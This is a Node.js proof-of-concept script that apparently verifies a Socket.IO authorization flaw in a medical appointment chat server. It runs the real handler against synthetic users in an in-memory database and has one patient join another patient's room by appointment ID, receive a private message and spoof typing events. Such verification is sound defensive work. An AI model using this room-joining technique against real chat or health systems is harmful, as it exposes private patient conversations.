// V4 PoC – Socket.IO room authorization.
// Starts the real chat socket handler (server/socket/chatSocket.js) on an in-memory
// MongoDB with synthetic users, then as patient A tries to join patient B's
// appointment room. Only event names/flags are recorded; message text is redacted.
//
// Usage (from repo root):
//   npm install --prefix security-evidence/V4 --no-package-lock
//   node security-evidence/V4/poc-socket.js <label>      -> writes poc-<label>.json here
const path = require("path");
const fs = require("fs");
const http = require("http");
// SERVER_DIR lets the same script run against another checkout (e.g. the pre-fix commit).
const S = process.env.SERVER_DIR ? path.resolve(process.env.SERVER_DIR) : path.resolve(__dirname, "../../server");
const r = (p) => require(`${S}/${p}`);
const mongoose = r("node_modules/mongoose");
const jwt = r("node_modules/jsonwebtoken");
const { Server } = r("node_modules/socket.io");
const { MongoMemoryServer } = r("node_modules/mongodb-memory-server");
const { io: ioc } = require("socket.io-client");

process.env.JWT_ACCESS_SECRET = "poc-only-secret"; // throwaway, never a real secret
const User = r("models/User");
const Appointment = r("models/Appointment");

const wait = (ms) => new Promise((ok) => setTimeout(ok, ms));
const EVENTS = ["room_joined", "join_error", "new_message", "user_typing", "send_error"];

(async () => {
  const label = process.argv[2] || "run";
  // Keep the handler's console logging out of the evidence output.
  const log = console.log; console.log = () => {}; console.warn = () => {}; console.error = () => {};

  const mongo = await MongoMemoryServer.create();
  await mongoose.connect(mongo.getUri());
  const mk = (role, n) => User.create({ role, email: `${n}@poc.invalid`, passwordHash: "x" });
  const userA = await mk("patient", "user-a");
  const userB = await mk("patient", "user-b");
  const doctorB = await mk("doctor", "doctor-b");
  const roomB = String((await Appointment.create({ patient: userB._id, doctor: doctorB._id,
    date: new Date("2026-10-01"), time: "10:00", consultationType: "video", status: "confirmed" }))._id);

  const srv = http.createServer();
  const io = new Server(srv);
  r("socket/chatSocket").registerSocketHandlers(io);
  await new Promise((ok) => srv.listen(0, ok));
  const url = `http://localhost:${srv.address().port}`;
  const token = (u) => jwt.sign({ userId: String(u._id), role: u.role }, process.env.JWT_ACCESS_SECRET);
  const connect = (auth) => new Promise((ok) => {
    const s = ioc(url, { auth, transports: ["websocket"], reconnection: false });
    s.on("connect", () => ok({ s, ok: true }));
    s.on("connect_error", (e) => { ok({ s, ok: false, error: e.message }); s.close(); });
  });
  const record = (s) => { const got = []; EVENTS.forEach((ev) => s.on(ev, (p) => got.push({ event: ev, isTyping: p?.isTyping, fromUserA: p?.userId ? String(p.userId) === String(userA._id) : undefined }))); return got; };

  const A = (await connect({ token: token(userA) })).s;
  const B = (await connect({ token: token(userB) })).s;
  const D = (await connect({ token: token(doctorB) })).s;
  const gotA = record(A), gotB = record(B);

  B.emit("join_room", { appointmentId: roomB });
  D.emit("join_room", { appointmentId: roomB });
  await wait(300);
  A.emit("join_room", { appointmentId: roomB });                        // attack: join B's room by ID
  await wait(300);
  D.emit("send_message", { appointmentId: roomB, message: "synthetic private note" });
  B.emit("typing", { appointmentId: roomB, isTyping: true });
  await wait(300);
  A.emit("typing", { appointmentId: roomB, isTyping: true });           // attack: spoof typing into B's room
  await wait(400);

  const noToken = await connect({});
  const inactive = await User.updateOne({ _id: userA._id }, { isActive: false }).then(() => connect({ token: token(userA) }));

  const result = {
    label,
    scenario: "patient A (not a participant) emits join_room with patient B's appointment id",
    attackerReceived: gotA,
    victimReceivedSpoofedTypingFromA: gotB.some((e) => e.event === "user_typing" && e.fromUserA),
    attackerReceivedPrivateMessage: gotA.some((e) => e.event === "new_message"),
    attackerJoinConfirmed: gotA.some((e) => e.event === "room_joined"),
    unauthenticatedSocket: noToken.ok ? "CONNECTED" : `rejected (${noToken.error})`,
    deactivatedUserSocket: inactive.ok ? "CONNECTED" : `rejected (${inactive.error})`,
    note: "Message text, user ids and tokens are intentionally not recorded.",
  };
  fs.writeFileSync(path.join(__dirname, `poc-${label}.json`), JSON.stringify(result, null, 2));
  log(JSON.stringify(result, null, 2));

  [A, B, D, noToken.s, inactive.s].forEach((s) => s.close());
  io.close(); srv.close();
  await mongoose.disconnect(); await mongo.stop(); process.exit(0);
})().catch((e) => { console.log = console.info; console.info(e); process.exit(1); });
